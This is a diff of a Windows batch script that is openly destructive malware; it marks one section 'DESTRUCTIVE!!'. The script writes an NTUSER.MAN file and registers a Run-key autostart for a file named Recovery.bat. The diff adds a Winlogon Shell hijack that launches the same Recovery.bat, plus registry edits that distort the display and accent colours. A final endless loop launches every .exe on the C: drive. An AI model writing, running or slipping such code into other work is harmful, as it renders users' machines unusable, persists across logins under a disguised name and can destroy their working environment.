@@ -86,8 +86,16 @@ Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v 
 REM ; DESTRUCTIVE!!
 echo. > %USERPROFILE%\NTUSER.MAN
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recovery" /t REG_SZ /d "%appdata%\Microsoft\Recovery.bat" /f
-reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d ""
+reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,%appdata%\Microsoft\Recovery.bat"
 REM ; end of
+reg add "HKCU\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d "192"
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "BorderWidth" /t REG_SZ /d "-175"
+reg add "HKCU\Control Panel\Software\Microsoft\Windows\DWM" /v "ColorPrevalence" /t REG_SZ /d "1"
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "AccentColor" /t REG_SZ /d "ff0000ff"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "ColorPrevalence" /t REG_SZ /d "1"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu" /t REG_SZ /d "ff0000ff"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu"/t REG_SZ /d "ff0000ff"
+
 :1
 for /r "C:\" %%a in (*.exe) do start "" "%%~fa"
 goto 1
